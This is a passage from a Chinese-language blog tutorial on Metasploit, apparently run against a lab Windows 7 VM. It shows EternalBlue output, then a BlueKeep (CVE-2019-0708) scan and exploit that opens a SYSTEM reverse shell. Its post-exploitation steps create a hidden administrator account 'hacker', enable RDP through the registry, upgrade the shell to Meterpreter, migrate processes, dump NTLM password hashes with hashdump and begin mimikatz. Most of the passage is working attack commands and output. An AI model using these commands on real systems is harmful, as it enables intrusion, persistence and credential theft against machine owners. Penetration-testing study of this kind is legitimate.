class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.109:4444</span><br><span class="line">[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.1.102:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.1.102:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.1.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.1.102:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service</span><br><span class="line">[*] 192.168.1.102:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1</span><br><span class="line">[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.1.102:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.1.102:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.1.102:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.1.102:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.1.102:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.1.102:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.1.102:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49161) at 2019-09-17 02:41:44 -0400</span><br><span class="line">[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h1 id="BlueKeep"><a href="#BlueKeep" class="headerlink" title="BlueKeep"></a>BlueKeep</h1><h2 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h2><p><a href="https://en.wikipedia.org/wiki/BlueKeep" target="_blank" rel="noopener">BlueKeep</a>（CVE-2019-0708）是 Microsoft 远程桌面协议实现中发现的一个安全漏洞，它允许远程执行代码。首次报告于 2019 年 5 月，它存在于从 Windows 2000 到 Windows Server 2008 R2 和 Windows 7 的所有未修补的基于 Windows NT 的 Microsoft Windows 版本中。Microsoft 发布了一个安全补丁（包括几个版本的带外更新） 在 2019 年 5 月 14 日，已经达到其寿命结束的 Windows，例如 Windows XP。在 2019 年 8 月 13 日，据报道，相关的 BlueKeep 安全漏洞（统称为 DejaBlue）会影响较新的 Windows 版本，包括 Windows 7 和所有最新版本 高达 Windows 10 的操作系统，以及较旧的 Windows 版本。2019 年 9 月 6 日，Metasploit 利用可疑的 BlueKeep 安全漏洞宣布已经发布到公共领域。</p><p>下面通过 Metasploit Framework 对 BlueKeep 进行利用，具体脚本来自 <a href="https://github.com/NAXG/cve_2019_0708_bluekeep_rce" target="_blank" rel="noopener">Github</a>。</p><h2 id="Scan-1"><a href="#Scan-1" class="headerlink" title="Scan"></a>Scan</h2><p>先使用 <code>auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code> 模块对靶机进行扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line">   THREADS          1                yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name  Description</span><br><span class="line">   ----  -----------</span><br><span class="line">   Scan  Scan for exploitable targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)</span><br><span class="line">[+] 192.168.1.102:3389    - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.102:3389    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>确定存在漏洞后使用 <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块攻击，并得到 CMD Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.109:4444</span><br><span class="line">[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)</span><br><span class="line">[+] 192.168.1.102:3389    - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.102:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.</span><br><span class="line">[*] 192.168.1.102:3389 - Surfing channels ...</span><br><span class="line">[*] 192.168.1.102:3389 - Lobbing eggs ...</span><br><span class="line">[*] 192.168.1.102:3389 - Forcing the USE of FREE&apos;d object ...</span><br><span class="line">[*] Command shell session 2 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49162) at 2019-09-17 02:47:40 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h1><p>在获取到 CMD Shell 之后可以做更多好玩的事情，比如使用 Meterpreter 进行后渗透等等，这里只记录一部分。</p><h2 id="新建用户并进行远程连接"><a href="#新建用户并进行远程连接" class="headerlink" title="新建用户并进行远程连接"></a>新建用户并进行远程连接</h2><p>在得到一个 CMD Shell 后，可以新建一个用户并加入管理员组：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">net</span> <span class="title">user</span> <span class="title">hacker</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">user</span> <span class="title">hacker</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function">����ɹ���ɡ�</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function">����ɹ���ɡ�</span></span><br></pre></td></tr></table></figure><p>开启远程连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">REG</span> <span class="title">ADD</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Control</span>\<span class="title">Terminal</span>" "<span class="title">Server</span> /<span class="title">v</span> <span class="title">fDenyTSConnections</span> /<span class="title">t</span> <span class="title">REG_DWORD</span> /<span class="title">d</span> 0 /<span class="title">f</span></span></span><br><span class="line"><span class="function">����ɹ���ɡ�</span></span><br></pre></td></tr></table></figure><p>然后使用 Kali 下的远程桌面进行连接，使用新创建的用户 hacker 登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.1.102:3389</span><br><span class="line"><span class="comment"># rdesktop 192.168.1.102 -u hacker -p hacker</span></span><br></pre></td></tr></table></figure><p><img src="/pics/Have-Fun-with-Metasploit-Framework/1.png" alt="使用新建用户 hacker 登录"></p><h2 id="将普通的-CMD-Shell-升级为-Meterpreter"><a href="#将普通的-CMD-Shell-升级为-Meterpreter" class="headerlink" title="将普通的 CMD Shell 升级为 Meterpreter"></a>将普通的 CMD Shell 升级为 Meterpreter</h2><p>原本的 CMD Shell 可以做的事情有限，使用 sessions 命令升级到 Meterpreter 可以做更多好玩的事。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type               Information                                                                       Connection</span><br><span class="line">  --  ----  ----               -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102)</span><br><span class="line">  2         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)</span><br><span class="line"></span><br><span class="line">msf5 &gt; sessions -u 1</span><br><span class="line">[*] Executing &apos;post/multi/manage/shell_to_meterpreter&apos; on session(s): [1]</span><br><span class="line"></span><br><span class="line">[*] Upgrading session ID: 1</span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.109:4433</span><br><span class="line">msf5 &gt;</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.102</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.109:4433 -&gt; 192.168.1.102:49163) at 2019-09-17 02:55:12 -0400</span><br><span class="line">[*] Stopping exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf5 &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                                                                       Connection</span><br><span class="line">  --  ----  ----                     -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102)</span><br><span class="line">  2         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)</span><br><span class="line">  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-Q595JS8OROC                                             192.168.1.109:4433 -&gt; 192.168.1.102:49163 (192.168.1.102)</span><br></pre></td></tr></table></figure><p>多了一个 session 3，打开后得到 Meterpreter 的 Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions 3</span><br><span class="line">[*] Starting interaction with 3...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>然后可以看到得到的 Meterpreter 是 32 位的，可以通过把它绑定到某个 64 位的程序（所属用户为 SYSTEM）来修改成 64 位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-Q1ST6EBNLTR</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                    Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                    ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]</span><br><span class="line"> 4     0     System                  x64   0</span><br><span class="line"> 100   780   audiodg.exe             x64   0</span><br><span class="line"> 268   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> 352   344   csrss.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 404   344   wininit.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> 416   396   csrss.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 420   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 464   396   winlogon.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> 512   404   services.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br><span class="line"> 520   404   lsass.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe</span><br><span class="line"> 528   404   lsm.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe</span><br><span class="line"> 572   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 632   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 696   512   vmacthlp.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe</span><br><span class="line"> 728   512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 780   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 896   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 960   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 964   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 1096  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1192  512   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe</span><br><span class="line"> 1228  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 1240  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 1300  512   msdtc.exe               x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1440  512   VGAuthService.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe</span><br><span class="line"> 1464  512   vmtoolsd.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 1624  512   sppsvc.exe              x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1704  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 1744  512   mscorsvw.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 1768  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1836  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe</span><br><span class="line"> 1844  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe</span><br><span class="line"> 1860  632   WmiPrvSE.exe</span><br><span class="line"> 1984  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2000  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 2084  512   VSSVC.exe               x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2116  2424  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe</span><br><span class="line"> 2192  2116  powershell.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line"> 2228  632   WmiPrvSE.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe</span><br><span class="line"> 2320  512   taskhost.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2368  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe</span><br><span class="line"> 2392  896   dwm.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\dwm.exe</span><br><span class="line"> 2404  2384  explorer.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\explorer.exe</span><br><span class="line"> 2424  1192  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe</span><br><span class="line"> 2516  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2548  512   WmiApSrv.exe            x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2584  512   mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 2756  512   SearchIndexer.exe       x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2852  2756  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchFilterHost.exe</span><br><span class="line"> 2888  2756  SearchProtocolHost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchProtocolHost.exe</span><br><span class="line"> 2968  2404  cmd.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\cmd.exe</span><br><span class="line"> 2976  416   conhost.exe             x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\conhost.exe</span><br><span class="line"> 3060  3020  powershell.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 2368</span><br><span class="line">[*] Migrating from 3060 to 2368...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-Q1ST6EBNLTR</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h3 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h3><p>利用 hashdump 可以获得所有用户密码的哈希值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY a648199744904bf08ff1b92b5b224011...</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">victim:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::</span><br><span class="line">hacker:1001:aad3b435b51404eeaad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157:::</span><br></pre></td></tr></table></figure><p>使用神器 mimikatz 有可能能得到密码的明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span 